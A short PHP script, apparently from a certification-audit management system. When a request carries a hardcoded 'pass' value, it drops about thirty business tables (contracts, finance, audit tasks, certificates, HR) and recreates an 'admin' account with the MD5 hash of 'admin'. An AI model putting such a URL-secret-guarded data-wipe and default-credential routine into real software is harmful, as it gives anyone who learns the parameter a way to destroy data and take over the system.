<?php
//@zbzytech 加入过滤机制 &pass=bydpdwz

$pass = getgp('pass');
if($pass == 'bydpdwz'){
    $tables=array(
        //企业
        'sp_enterprises',
        'sp_enterprises_site',
        'sp_attachments',
        'sp_metas_ep',
        //合同
        'sp_contract',
        'sp_contract_item',
        'sp_contract_num',
        //财务
        'sp_contract_cost',
        'sp_contract_cost_detail',
        //审核任务
        'sp_project',
        'sp_ifcation',
        'sp_task',
        'sp_task_audit_team',
        'sp_task_note',
        'sp_access_result',
        'sp_access_set_ver',
        'sp_assess_notes',
        'sp_auditor_report',
        //证书
        'sp_certificate',
        'sp_certificate_change',
        //人员
        'sp_hr',
        'sp_hr_archives',
        'sp_metas_hr',
        'sp_hr_audit_code',
        'sp_hr_audit_code_app',
        'sp_hr_experience',
        'sp_hr_qualification',
        // 其他
        'sp_sms',
        'sp_metas_ot',
        'sp_notice',
        'sp_user_menus',
    );
    $db->drop_more($tables);
    //系统管理员
    $admin_array = array(
        'username' => 'admin',
        'password' => '21232f297a57a5a743894a0e4a801fc3',
        'name' => '管理员',
        'ctfrom' => '01000000',
        'is_hire' => '0',
    ); 
    $db->insert( 'hr', $admin_array );   
}else{
    log_add(0, 0, "安全警报，请联系管理员", NULL, NULL);
}

?> 